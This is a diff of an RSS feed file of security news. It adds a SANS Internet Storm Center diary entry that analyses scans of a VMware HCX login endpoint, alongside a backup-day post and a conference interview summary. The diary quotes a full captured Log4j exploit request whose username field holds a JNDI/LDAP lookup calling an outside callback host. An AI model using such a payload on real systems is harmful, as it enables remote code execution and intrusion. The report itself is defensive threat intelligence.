@@ -1,5 +1,62 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Wed, 12 Mar 2025 14:59:18 +0000</lastBuildDate><item><title>World Backup Day: Pledge to protect your digital life</title><link>https://www.webroot.com/blog/2025/03/12/world-backup-day-pledge-to-protect-your-digital-life/</link><description>&lt;p&gt;Our digital lives are filled with essential personal information, and it’s easy to forget how vulnerable all that data can be. But if your hard drive crashes, your laptop gets stolen, or you fall victim to cybercrime, the loss can be devastating. Your financial records, your work files, and even years of family photos can [&amp;#8230;]&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Wed, 12 Mar 2025 15:59:25 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Scans for VMWare Hybrid Cloud Extension (HCX) API (Log4j - not brute forcing)</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Scans for VMWare Hybrid Cloud Extension (HCX) API (Log4j - not brute forcing), (Wed, Mar 12th)</title><link>https://isc.sans.edu/diary/rss/31762</link><description>&lt;p&gt;Today, I noticed increased scans for the VMWare Hyprid Cloud Extension (HCX) "sessions" endpoint. These endpoints are sometimes associated with exploit attempts for various VMWare vulnerabilities to determine if the system is running the extensions or to gather additional information to aid exploitation.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;Today, I noticed increased scans for the VMWare Hyprid Cloud Extension (HCX) &amp;quot;sessions&amp;quot; endpoint. These endpoints are sometimes associated with exploit attempts for various VMWare vulnerabilities to determine if the system is running the extensions or to gather additional information to aid exploitation.&lt;/p&gt;
+
+&lt;p&gt;Initially, based on the URL, I suspected brute forcing. However, after reviewing some complete requests (see below), it turns out that these attempts are exploiting the Log4j vulnerability.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href="https://isc.sans.edu/diaryimages/images/Screenshot%202025-03-12%20at%209_39_48%E2%80%AFAM.png"&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Screenshot%202025-03-12%20at%209_39_48%E2%80%AFAM.png" style="width: 400px; height: 221px;" /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The specific URL seen above is&amp;nbsp;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;/hybridity/api/sessions&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This particular request is likely used to brute force credentials. the &amp;quot;sessions&amp;quot; endpoint expects a JSON payload with the username and payload like:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;{&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;&amp;nbsp; &amp;quot;authtype&amp;quot;: &amp;quot;password&amp;quot;,&lt;br /&gt;
+&amp;nbsp; &amp;quot;username&amp;quot;: &amp;quot;admin&amp;quot;,&lt;br /&gt;
+&amp;nbsp; &amp;quot;password&amp;quot;: &amp;quot;somecomplexpassword&amp;quot;&lt;br /&gt;
+}&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The response will either be a 401 response if the authentication failed or a 200 response if it succeeded. A successful response includes a &amp;quot;sessionId&amp;quot;, which will be used as a bearer token to authenticate additional requests.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;UPDATED ANALYSIS&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Initially, I did not have access to the request payload. However, after reviewing the payload of a few samples, it looks like these are not brute-force attempts. Instead, they are exploiting the Log4j vulnerability via the &amp;quot;username&amp;quot; parameter, which is likely logged and VMware is using the Log4j library and was vulnerable to the related vulnerability.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Complete request:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;POST /hybridity/api/sessions HTTP/1.1&lt;br /&gt;
+User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36&lt;br /&gt;
+Connection: close&lt;br /&gt;
+Content-Length: 169&lt;br /&gt;
+Accept: application/json&lt;br /&gt;
+Content-Type: application/json&lt;br /&gt;
+Origin: https://[victim IP]:4443&lt;br /&gt;
+Accept-Encoding: gzip&lt;br /&gt;
+&lt;br /&gt;
+{\r\n &amp;nbsp;&amp;quot;authType&amp;quot;: &amp;quot;password&amp;quot;,\r\n &amp;nbsp;&amp;quot;username&amp;quot;: &amp;quot;${jndi:ldap://${:-670}${:-930}.${hostName}.username.cv7u8tq2cnhfm80gc3n0npwaauo98azq9.oast.live}&amp;quot;,\r\n &amp;nbsp;&amp;quot;password&amp;quot;: &amp;quot;admin&amp;quot;\r\n}&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So far, we see these requests mostly from one IP address: %%ip:107.173.125.163%% using randomized valid user agents. The IP address was first seen yesterday in our logs and is scanning for Log4j vulnerable systems, particularly by accessing login pages. These other attempts likely use a payload similar to the request above.&amp;nbsp;&amp;nbsp;&lt;span style="margin: 0px; padding: 0px;"&gt;See &lt;a href="https://isc.sans.edu/weblogs/sourcedetails.html?date=2025-03-11&amp;amp;ip=107.173.125.163"&gt;this page&lt;/a&gt; for a complete list of requests sent by this IP address&lt;/span&gt;.&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;---&lt;br /&gt;
+Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;SANS.edu&lt;/a&gt;&lt;br /&gt;
+&lt;a href="https://jbu.me/164"&gt;Twitter&lt;/a&gt;|&lt;/p&gt;
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31762</guid></item><item><title>World Backup Day: Pledge to protect your digital life</title><link>https://www.webroot.com/blog/2025/03/12/world-backup-day-pledge-to-protect-your-digital-life/</link><description>&lt;p&gt;Our digital lives are filled with essential personal information, and it’s easy to forget how vulnerable all that data can be. But if your hard drive crashes, your laptop gets stolen, or you fall victim to cybercrime, the loss can be devastating. Your financial records, your work files, and even years of family photos can [&amp;#8230;]&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/03/12/world-backup-day-pledge-to-protect-your-digital-life/" rel="nofollow"&gt;World Backup Day: Pledge to protect your digital life&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Our digital lives are filled with essential personal information, and it’s easy to forget how vulnerable all that data can be. But if your hard drive crashes, your laptop gets stolen, or you fall victim to cybercrime, the loss can be devastating. Your financial records, your work files, and even years of family photos can disappear in and instance. It’s a nightmare scenario that happens more often than you think. That’s why March 31st is &lt;a href="https://www.worldbackupday.com/en" rel="noreferrer noopener" target="_blank"&gt;World Backup Day&lt;/a&gt;, serving as a reminder that the right backup strategy can save you the frustration, cost, and the heartache of losing information that’s dear to you.&lt;/p&gt;
 
 
@@ -203,46 +260,12 @@
 
 &lt;li&gt;&lt;a href="https://www.carbonite.com/blog/2019/cloud-storage-vs.-cloud-backup-whats-the-difference" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;Cloud &lt;/strong&gt;&lt;/a&gt;&lt;a href="https://www.carbonite.com/blog/2019/cloud-storage-vs.-cloud-backup-whats-the-difference" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;s&lt;/strong&gt;&lt;/a&gt;&lt;a href="https://www.carbonite.com/blog/2019/cloud-storage-vs.-cloud-backup-whats-the-difference" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;torage vs. cloud backup&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/03/12/world-backup-day-pledge-to-protect-your-digital-life/" rel="nofollow"&gt;World Backup Day: Pledge to protect your digital life&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.webroot.com/blog/?p=33751</guid><category>Threat Lab</category></item><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Scans for VMWare Hybrid Cloud Extension (HCX) API (Brutefording Credentials&amp;#x3f;)</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Scans for VMWare Hybrid Cloud Extension (HCX) API (Brutefording Credentials&amp;#x3f;), (Wed, Mar 12th)</title><link>https://isc.sans.edu/diary/rss/31762</link><description>&lt;p&gt;Today, I noticed increased scans for the VMWare Hyprid Cloud Extension (HCX) "sessions" endpoint. These endpoints are sometimes associated with exploit attempts for various VMWare vulnerabilities to determine if the system is running the extensions or to gather additional information to aid exploitation.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;Today, I noticed increased scans for the VMWare Hyprid Cloud Extension (HCX) &amp;quot;sessions&amp;quot; endpoint. These endpoints are sometimes associated with exploit attempts for various VMWare vulnerabilities to determine if the system is running the extensions or to gather additional information to aid exploitation.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href="https://isc.sans.edu/diaryimages/images/Screenshot%202025-03-12%20at%209_39_48%E2%80%AFAM.png"&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Screenshot%202025-03-12%20at%209_39_48%E2%80%AFAM.png" style="width: 400px; height: 221px;" /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;The specific URL seen above is&amp;nbsp;&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;/hybridity/api/sessions&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;This particular request is likely used to brute force credentials. the &amp;quot;sessions&amp;quot; endpoint expects a JSON payload with the username and payload like:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;{&lt;br /&gt;
-&amp;nbsp; &amp;quot;username&amp;quot;: &amp;quot;admin&amp;quot;,&lt;br /&gt;
-&amp;nbsp; &amp;quot;password&amp;quot;: &amp;quot;somecomplexpassword&amp;quot;&lt;br /&gt;
-}&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;The response will either be a 401 response if the authentication failed or a 200 response if it succeeded. A successful response includes a &amp;quot;sessionId&amp;quot;, which will be used as a bearer token to authenticate additional requests.&lt;/p&gt;
-
-&lt;p&gt;So far, we see these requests mostly from one IP address: %%ip:107.173.125.163%% using randomized valid user agents. The IP address was first seen yesterday in our logs, and is scanning for Log4j vulnerable systems and a few other issues. It may also attempt to brute force a few other web applications. For a complete list of requests sent by this IP address, see &lt;a href="https://isc.sans.edu/weblogs/sourcedetails.html?date=2025-03-11&amp;amp;ip=107.173.125.163"&gt;this page&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;
-
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;
-
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;
-
-&lt;p&gt;---&lt;br /&gt;
-Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;SANS.edu&lt;/a&gt;&lt;br /&gt;
-&lt;a href="https://jbu.me/164"&gt;Twitter&lt;/a&gt;|&lt;/p&gt;
-
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31762</guid></item><item><title>LABScon24 Replay | Resilience and Protection in the Windows Ecosystem</title><link>https://www.sentinelone.com/labs/labscon24-replay-resilience-and-protection-in-the-windows-ecosystem/</link><description>Kim Zetter interviews David Weston on topics such as the fallout from the CrowdStrike outage, Windows Recall and improving Microsoft security.</description><content:encoded>&lt;p&gt;In this exclusive interview at LABScon 2024, award-winning investigative journalist Kim Zetter and Microsoft VP of Enterprise and OS Security David Weston discuss Microsoft kernel security, the CrowdStrike outage, AI, and how Microsoft plans to improve the resilience and security of the Windows ecosystem.&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/03/12/world-backup-day-pledge-to-protect-your-digital-life/" rel="nofollow"&gt;World Backup Day: Pledge to protect your digital life&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.webroot.com/blog/?p=33751</guid><category>Threat Lab</category></item><item><title>LABScon24 Replay | Resilience and Protection in the Windows Ecosystem</title><link>https://www.sentinelone.com/labs/labscon24-replay-resilience-and-protection-in-the-windows-ecosystem/</link><description>Kim Zetter interviews David Weston on topics such as the fallout from the CrowdStrike outage, Windows Recall and improving Microsoft security.</description><content:encoded>&lt;p&gt;In this exclusive interview at LABScon 2024, award-winning investigative journalist Kim Zetter and Microsoft Corporate VP Enterprise and OS Security David Weston discuss Microsoft kernel security, the CrowdStrike outage, AI, and how Microsoft plans to improve the resilience and security of the Windows ecosystem.&lt;/p&gt;
 &lt;p&gt;As the world&amp;#8217;s data has increasingly become associated with Microsoft infrastructure and exposed to Microsoft products, threat actors have focused their efforts on exploiting security weaknesses in the vendor&amp;#8217;s operating system. Weston and Zetter explore how this has led Microsoft to raise the priority of security at the engineering level, even at the expense of curtailing operating system features.&lt;/p&gt;
 &lt;p&gt;In addition, the conversation ranges over how the CrowdStrike outage of 2024 led Microsoft to a new focus on resilience and to the development of a user mode API to restrict access to the kernel to third party products. Weston also discusses the need for security vendors to implement secure deployment practices to better protect customers from rogue updates and tackles questions around the use of AI and the controversial Windows Recall feature.&lt;/p&gt;
 &lt;p&gt;&lt;/p&gt;
 &lt;h2&gt;About the Authors&lt;/h2&gt;
-&lt;p&gt;&lt;a href="https://www.linkedin.com/in/dwizzzle/" rel="noopener noreferrer" target="_blank"&gt;David Weston&lt;/a&gt; is the Vice President of enterprise and OS security at Microsoft where he is responsible for the security engineering of Windows, Azure Linux, XBOX, Windows Server, the Azure OS as well as the Offensive Security Research &amp;amp; Engineering Team.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.linkedin.com/in/dwizzzle/" rel="noopener noreferrer" target="_blank"&gt;David Weston&lt;/a&gt; is Corporate Vice President, Enterprise and OS Security at Microsoft where he is responsible for the security engineering of Windows, Azure Linux, XBOX, Windows Server, the Azure OS as well as the Offensive Security Research &amp;amp; Engineering Team.&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.zetter-zeroday.com/" rel="noopener noreferrer" target="_blank"&gt;Kim Zetter&lt;/a&gt; is an award-winning investigative journalist who has covered cybersecurity and national security for more than a decade, most notably for WIRED, where she wrote for thirteen years, and more recently for the New York Times Magazine, Politico, Washington Post, Motherboard, and Yahoo News. She has been voted one of the top ten security journalists in the country by security professionals and her journalism peers.&lt;/p&gt;
 &lt;h2&gt;About LABScon&lt;/h2&gt;
 &lt;p&gt;This presentation was featured live at &lt;a href="https://www.labscon.io/" rel="noopener noreferrer" target="_blank"&gt;LABScon&lt;/a&gt; 2024, an immersive 3-day conference bringing together the world’s top cybersecurity minds, hosted by SentinelOne’s research arm, SentinelLABS.&lt;/p&gt;
